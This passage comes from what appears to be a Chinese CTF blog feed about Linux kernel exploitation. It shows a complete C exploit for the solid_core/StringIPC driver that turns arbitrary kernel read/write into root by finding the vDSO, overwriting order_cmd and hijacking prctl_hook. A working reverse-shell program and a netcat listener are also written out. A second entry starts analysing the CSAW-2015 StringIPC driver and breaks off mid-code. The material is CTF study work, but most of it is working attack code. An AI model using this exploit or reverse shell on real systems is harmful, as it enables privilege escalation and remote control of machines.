CSAW_IOCTL_BASE + 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">size_t</span> buf_size;</span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">open_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> *buf;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span> index;</span><br><span class="line"><span class="keyword">int</span> whence;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ((len / <span class="number">8</span>) * <span class="number">8</span>); i += <span class="number">8</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;0x%lx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i));</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">16</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_vdso_userspace</span><span class="params">(<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = len; i &lt; <span class="number">0x1000</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(<span class="keyword">char</span> *)(addr + i));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check_vsdo_shellcode</span><span class="params">(<span class="keyword">char</span> *shellcode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0</span>;</span><br><span class="line">addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;vdso:%lx\n&quot;</span>, addr);</span><br><span class="line"><span class="keyword">if</span> (addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-]cannot get vdso addr&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (memmem((<span class="keyword">char</span> *)addr, <span class="number">0x1000</span>, shellcode, <span class="built_in">strlen</span>(shellcode)))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_gettimeofday_str_offset</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">size_t</span> vdso_addr = getauxval(AT_SYSINFO_EHDR);</span><br><span class="line"><span class="keyword">char</span> *name = <span class="string">&quot;gettimeofday&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!vdso_addr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> name_addr = memmem(vdso_addr, <span class="number">0x1000</span>, name, <span class="built_in">strlen</span>(name));</span><br><span class="line"><span class="keyword">if</span> (name_addr &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-]error get name&#x27;s offset&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> name_addr - vdso_addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">size_t</span> result = <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_channel_args</span> <span class="title">alloc_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shrink_channel_args</span> <span class="title">shrink_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seek_channel_args</span> <span class="title">seek_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">read_channel_args</span> <span class="title">read_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">close_channel_args</span> <span class="title">close_args</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">write_channel_args</span> <span class="title">write_args</span>;</span></span><br><span class="line"><span class="keyword">size_t</span> addr = <span class="number">0xffffffff80000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> real_cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> cred = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> target_addr;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> selinux_disable_addr = <span class="number">0x2C7BA0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prctl_hook = <span class="number">0x124FD00</span>;</span><br><span class="line"><span class="keyword">size_t</span> order_cmd = <span class="number">0x123D1E0</span>;</span><br><span class="line"><span class="keyword">size_t</span> poweroff_work_func_addr = <span class="number">0x9C4C0</span>;</span><br><span class="line"><span class="keyword">int</span> root_cred[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">int</span> offset;</span><br><span class="line">offset = get_gettimeofday_str_offset();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;gettimeofday str in vdso.so offset=0x%x\n&quot;</span>, offset);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">16</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(target, <span class="string">&quot;trytofind196082&quot;</span>);</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/proc/simp1e&quot;</span>, O_RDWR);</span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] open error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_args.buf_size = <span class="number">0x100</span>;</span><br><span class="line">alloc_args.id = <span class="number">-1</span>;</span><br><span class="line">ioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);</span><br><span class="line"><span class="keyword">if</span> (alloc_args.id == <span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[-] alloc_channel error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] now we get a channel %d\n&quot;</span>, alloc_args.id);</span><br><span class="line">shrink_args.id = alloc_args.id;</span><br><span class="line">shrink_args.size = <span class="number">0x100</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[+] we can read and write any momery&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (; addr &lt; <span class="number">0xffffffffffffefff</span>; addr += <span class="number">0x1000</span>)</span><br><span class="line">&#123;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = addr - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">read_args.id = alloc_args.id;</span><br><span class="line">read_args.buf = buf;</span><br><span class="line">read_args.count = <span class="number">0x1000</span>;</span><br><span class="line">ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);</span><br><span class="line"><span class="keyword">if</span> ((!<span class="built_in">strcmp</span>(<span class="string">&quot;gettimeofday&quot;</span>, buf + offset)))</span><br><span class="line">&#123;</span><br><span class="line">result = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found vdso %lx\n&quot;</span>, result);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (result == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;not found , try again &quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">kernel_base = addr - <span class="number">0x1020000</span>;</span><br><span class="line">prctl_hook += kernel_base;</span><br><span class="line">order_cmd += kernel_base;</span><br><span class="line">poweroff_work_func_addr += kernel_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel base: %lx\n&quot;</span>, kernel_base);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found prctl_hook: %lx\n&quot;</span>, prctl_hook);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found order_cmd : %lx\n&quot;</span>, order_cmd);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] found poweroff_work_func_addr: %lx\n&quot;</span>, poweroff_work_func_addr);</span><br><span class="line">ioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;/reverse_shell\0&quot;</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="built_in">strlen</span>(buf) + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = order_cmd + <span class="number">13</span> - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">*(<span class="keyword">size_t</span> *)buf = poweroff_work_func_addr;</span><br><span class="line">seek_args.id = alloc_args.id;</span><br><span class="line">seek_args.index = prctl_hook - <span class="number">0x10</span>;</span><br><span class="line">seek_args.whence = SEEK_SET;</span><br><span class="line">ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);</span><br><span class="line">write_args.id = alloc_args.id;</span><br><span class="line">write_args.buf = buf;</span><br><span class="line">write_args.count = <span class="number">20</span> + <span class="number">1</span>;</span><br><span class="line">ioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">prctl(addr, <span class="number">2</span>, addr, addr, <span class="number">2</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">system(<span class="string">&quot;nc -l -p 4444&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反弹shell程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> server_ip[] = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> server_port = <span class="number">4444</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sock = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">attacker_addr</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    attacker_addr.sin_family = AF_INET;</span><br><span class="line">    attacker_addr.sin_port = htons(server_port);</span><br><span class="line">    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);</span><br><span class="line">    <span class="keyword">while</span> (connect(sock, (struct sockaddr *)&amp;attacker_addr, <span class="keyword">sizeof</span>(attacker_addr)) != <span class="number">0</span>)</span><br><span class="line">        ;</span><br><span class="line">    dup2(sock, <span class="number">0</span>);</span><br><span class="line">    dup2(sock, <span class="number">1</span>);</span><br><span class="line">    dup2(sock, <span class="number">2</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目链接：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><hr><p>参考链接：<a class="link"   href="http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl" >http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这次的例题是solid_core，题目的整体和前面那一道stringipc几乎一样&lt;/p&gt;
&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="HijackPrctl" scheme="https://cv196082.gitee.io/tags/HijackPrctl/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn内存任意读写提升权限[1]</title>
    <link href="https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/"/>
    <id>https://cv196082.gitee.io/2022/08/03/kernel-pwn%E5%86%85%E5%AD%98%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%86%99%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90/</id>
    <published>2022-08-03T09:30:41.000Z</published>
    <updated>2022-08-04T07:51:51.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分析通过内存任意读写到提升权限的三种方式</p><p>在此之前呢，我所写的关于kernel的文章中适用到的提权方式基本都是通过<code>commit_creds(prepare_kernel_cred(0));</code>以及第一篇提到的直接修改cred结构体，所以这里将入门的其余几条提权方式记录一下</p><p>本文使用题目：<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><h3 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h3><p><strong>CSAW-2015-StringIPC</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 512M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot;</span> \</span><br><span class="line">-cpu qemu64,+smep,+smap \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  -enable-kvm  \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><p>首先了开启了smep和smap保护，没有开启kaslr</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br></pre></td></tr></table></figure><p>init脚本没什么好说的，这里将符号表放到了tmp内</p><p>下面来看驱动的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617364</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">0x10</span>LL) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-16LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> ( !private_data-&gt;channel )</span><br><span class="line">    &#123;</span><br><span class="line">        count = alloc_new_ipc_channel(*&amp;write_channel.id, &amp;channel);<span class="comment">// 根据write_channel.id的值申请相应大小的堆块</span></span><br><span class="line">        <span class="keyword">if</span> ( count &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            private_data-&gt;channel = channel;</span><br><span class="line">            LODWORD(write_channel.buf) = channel-&gt;id;<span class="comment">// 返回堆块相应的idx</span></span><br><span class="line">            <span class="keyword">if</span> ( copy_to_user(v5, &amp;write_channel, <span class="number">0x10</span>LL) )</span><br><span class="line">            &#123;</span><br><span class="line">                count = <span class="number">-22LL</span>;</span><br><span class="line">                close_ipc_channel(private_data, channel-&gt;id);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617365</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">4LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    p_lock = &amp;private_data-&gt;lock;</span><br><span class="line">    count = <span class="number">-16LL</span>;</span><br><span class="line">    mutex_lock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span> ( private_data-&gt;channel )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    channel_by_id = get_channel_by_id(write_channel.id, v5);<span class="comment">// 可以看到是根据idx获取channel</span></span><br><span class="line">    count = channel_by_id;</span><br><span class="line">    <span class="keyword">if</span> ( channel_by_id &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">    private_data-&gt;channel = channel_by_id;</span><br><span class="line">    <span class="keyword">if</span> ( !_InterlockedSub(&amp;channel_by_id-&gt;ref.refcount.counter, <span class="number">1u</span>) )</span><br><span class="line">        ipc_channel_destroy(&amp;channel_by_id-&gt;ref);<span class="comment">// 释放channel</span></span><br><span class="line">    count = <span class="number">0LL</span>;</span><br><span class="line">    mutex_unlock(&amp;private_data-&gt;lock);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x77617366</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">16LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v11 = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(v11);</span><br><span class="line">    v13 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_24;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0x77617367</span>u:</span><br><span class="line">    <span class="keyword">if</span> ( copy_from_user(&amp;write_channel, v3, <span class="number">16LL</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-22LL</span>;</span><br><span class="line">    v11 = &amp;private_data-&gt;lock;</span><br><span class="line">    mutex_lock(v11);</span><br><span class="line">    v13 = <span class="number">0LL</span>;</span><br><span class="line">LABEL_24:</span><br><span class="line">    count = realloc_ipc_channel(write_channel.id, write_channel.buf, v13, v12);</span><br><span class="line">    mutex_unlock(v11);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br></pre></td></tr></table></figure><p>可以看到这里会进入到realloc_ipc_channel</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">realloc_ipc_channel</span><span class="params">(ipc_state *state, __int64 id, <span class="keyword">size_t</span> size, <span class="keyword">int</span> grow)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// r13d</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// rbx</span></span><br><span class="line">    __int64 v8; <span class="comment">// r12</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    _fentry__(state, id);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    result = get_channel_by_id(state, id);<span class="comment">// 根据idx获取channel</span></span><br><span class="line">    v7 = result;</span><br><span class="line">    <span class="keyword">if</span> ( result &lt;= <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 )<span class="comment">// 变大还是变小</span></span><br><span class="line">            v8 = *(result + <span class="number">16</span>) + id;</span><br><span class="line">        <span 